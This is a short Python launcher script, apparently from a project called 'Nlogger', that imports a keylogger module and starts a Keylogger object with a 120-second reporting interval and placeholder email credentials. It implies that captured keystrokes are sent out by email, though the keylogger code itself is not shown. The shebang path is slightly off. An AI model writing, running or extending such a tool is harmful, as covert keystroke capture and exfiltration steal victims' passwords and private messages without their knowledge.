#Nlogger
#!/var/bin/env python

# This program is for using the Keylogger class
import keylogger

if __name__ == "__main__":
    my_keylogger = keylogger.Keylogger(120, "<email>", "<pass>")
    my_keylogger.start()



